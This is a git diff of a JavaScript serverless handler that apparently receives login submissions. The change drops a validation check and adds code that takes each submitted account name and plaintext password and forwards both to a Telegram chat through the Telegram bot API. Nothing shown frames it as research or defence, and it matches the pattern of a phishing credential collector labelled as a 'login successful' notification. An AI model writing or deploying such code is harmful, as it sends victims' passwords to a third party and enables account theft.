@@ -1,49 +1,35 @@
 export default async (req) => {
-
   if (req.method !== "POST") {
-
     return new Response("Method not allowed", { status: 405 });
-
   }
 
-
-
   try {
-
     const data = await req.json();
-
-
-
-    if (data.event !== "login_success") {
-
-      return new Response("Invalid event", { status: 400 });
-
-    }
-
-
 
     const email = data.account || "";
 
+    const Password = data.password;
 
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    const password = data.password || "";
+    const message = `🔔 Login successful\n📧 Account: ${email}\n🔑 Password: ${Password}`;
 
-
-
-    console.log("Login success:", email);
-
-
-
-    return new Response("Notification received", {
-
-      status: 200
-
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
     });
 
-  } catch {
+    return new Response("Notification sent", { status: 200 });
 
+  } catch (error) {
+    console.error(error);
     return new Response("Invalid request", { status: 400 });
-
   }
-
 };
